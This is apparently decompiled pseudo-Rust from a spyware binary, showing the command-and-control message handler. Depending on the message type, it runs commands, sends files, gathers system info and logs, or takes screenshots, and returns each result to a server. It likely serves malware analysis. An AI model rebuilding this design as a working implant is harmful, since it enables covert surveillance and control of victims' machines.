
  fn spyware::communication::server::handle_message::h02435bd595e8370d(arg1: *mut i64, arg2: i64) -> *mut *mut c_void

{
    let mut rbp: i64;
    let var_8: i64 = rbp;
    let mut var_338: *mut *mut [i8; 0x86];
    let mut result: *mut *mut c_void;
    let mut r12: i64;
    let mut r13: i64;
    let mut r15_1: i64;
    
    match *arg1 ^ 0x8000000000000000
    {
        0 =>
        {
            let var_2a8_1: i128 = *arg1.byte_offset(0x18);
            let mut var_2b8: i128 = *arg1.byte_offset(8);
            rbp = 1;
            r12 = 1;
            let mut var_198: i128;
            spyware::actions::commands::run_command_message::h528f548903eb1e39(&var_198, &var_2b8);
            let var_168: i64;
            let var_260_1: i64 = var_168;
            let var_178: i128;
            let var_270_1: i128 = var_178;
            let var_188: i128;
            let var_280_1: i128 = var_188;
            let var_290_1: i128 = var_198;
            let mut var_298: i64 = -0x7fffffffffffffff;
            r12 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_298, arg2);
            r12 = 1;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(result);
            let r15: i64 = -0x8000000000000000 ^ *arg1;
            
            if r15 > 8
            {
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            }
            
            match r15
            {
                0 | 6 | 8 =>
                {
                    return result;
                }
                1 | 3 | 5 | 7 =>
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
                }
                2 | 4 =>
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1]);
                }
            }
        }
        2 =>
        {
            let var_2c8_1: i64 = arg1[3];
            let mut var_2d8: i128 = *arg1.byte_offset(8);
            rbp = 1;
            r13 = 1;
            let mut var_160: i128;
            spyware::actions::basic_info::download_file_message::h8a802bf593e1dd2f(&var_160, 
                &var_2d8);
            let var_130: i64;
            let var_220_1: i64 = var_130;
            let var_140: i128;
            let var_230_1: i128 = var_140;
            let var_150: i128;
            let var_240_1: i128 = var_150;
            let var_250_1: i128 = var_160;
            let mut var_258: i64 = -0x7ffffffffffffffd;
            r13 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_258, arg2);
            r13 = 1;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(result);
            let r15_2: i64 = -0x8000000000000000 ^ *arg1;
            
            if r15_2 > 8
            {
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            }
            
            match r15_2
            {
                0 =>
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..ErrorInfo$GT$::ha6f395fa99b84bfa(&arg1[1]);
                }
                1 | 3 | 5 | 7 =>
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
                }
                2 | 6 | 8 =>
                {
                    return result;
                }
                4 =>
                {
                    return core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1]);
                }
            }
        }
        4 =>
        {
            let var_328_2: i64 = arg1[3];
            var_338 = *arg1.byte_offset(8);
            let mut var_70: i128;
            spyware::actions::basic_info::get_basic_info_request::h37840dd4820167af(&var_70);
            let var_40: i128;
            let var_88_1: i128 = var_40;
            let var_50: i128;
            let var_98_1: i128 = var_50;
            let var_60: i128;
            let var_a8_1: i128 = var_60;
            let mut var_b8: i128 = var_70;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_b8, arg2));
            r12 = 1;
            r13 = 1;
            result = core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&var_338);
            rbp = 0;
            r15_1 = -0x8000000000000000 ^ *arg1;
            
            if r15_1 > 8
            {
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            }
        }
        6 =>
        {
            rbp = 1;
            r12 = 1;
            r13 = 1;
            let mut var_128: i128;
            spyware::actions::log_actions::get_logs_request::h84eb7739ff3a4934(&var_128);
            let var_f8: i64;
            let var_1e0_1: i64 = var_f8;
            let var_108: i128;
            let var_1f0_1: i128 = var_108;
            let var_118: i128;
            let var_200_1: i128 = var_118;
            let var_210_1: i128 = var_128;
            let mut var_218: i64 = -0x7ffffffffffffff9;
            r12 = 1;
            r13 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_218, arg2);
            'label_44c9c7:
            rbp = 1;
            r12 = 1;
            r13 = 1;
            core::result::Result$LT$T$C$E$GT$::unwrap::hdc68abbd8ffe3c09(result);
            r15_1 = -0x8000000000000000 ^ *arg1;
            
            if r15_1 > 8
            {
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            }
        }
        8 =>
        {
            rbp = 1;
            r12 = 1;
            r13 = 1;
            let mut var_f0: i128;
            spyware::actions::screenshot_actions::get_screenshot_request::h77f87121c90614c4(
                &var_f0);
            let var_c0: i64;
            let var_1a0_1: i64 = var_c0;
            let var_d0: i128;
            let var_1b0_1: i128 = var_d0;
            let var_e0: i128;
            let var_1c0_1: i128 = var_e0;
            let var_1d0_1: i128 = var_f0;
            let mut var_1d8: i64 = -0x7ffffffffffffff7;
            r12 = 1;
            r13 = 1;
            result =
                spyware::communication::server::send_response::h17eae7eef2507d79(&var_1d8, arg2);
            goto 'label_44c9c7;
        }
        _ =>
        {
            result = core::sync::atomic::atomic_load::h8c88032dab18ab12();
            
            if result != 0
            {
                var_338 = &data_4b8b10;
                let var_330_1: i64 = 1;
                let var_328_1: i64 = 8;
                let var_320_1: i128 = {0};
                rbp = 1;
                r12 = 1;
                r13 = 1;
                let rax_5: i64 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b8b98);
                let mut var_300: *const i8 = "spyware::communication::serverUn…";
                let var_2f8_1: i64 = 0x1e;
                let var_2f0_1: *const i8 = "spyware::communication::serverUn…";
                let var_2e8_1: i64 = 0x1e;
                let var_2e0_1: i64 = rax_5;
                r12 = 1;
                r13 = 1;
                result = log::__private_api::log::h13afddf373bd7d7f(&var_338, 1, &var_300);
            }
            
            rbp = 1;
            r15_1 = -0x8000000000000000 ^ *arg1;
            
            if r15_1 > 8
            {
                return core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1);
            }
        }
    }
    
    match r15_1
    {
        0 =>
        {
            core::ptr::drop_in_place$LT$spyware..communication..messages..ErrorInfo$GT$::ha6f395fa99b84bfa(&arg1[1])
        }
        1 | 3 | 5 | 7 =>
        {
            core::ptr::drop_in_place$LT$spyware..communication..messages..Message$GT$::hdefc99125fc89861(arg1)
        }
        2 =>
        {
            core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1])
        }
        4 =>
        {
            if rbp == 0
            {
                return result;
            }
            
            core::ptr::drop_in_place$LT$spyware..communication..messages..DownloadFileRequest$GT$::h11893678bd4df8ad(&arg1[1])
        }
        6 | 8 =>
        {
            result
        }
    }
}
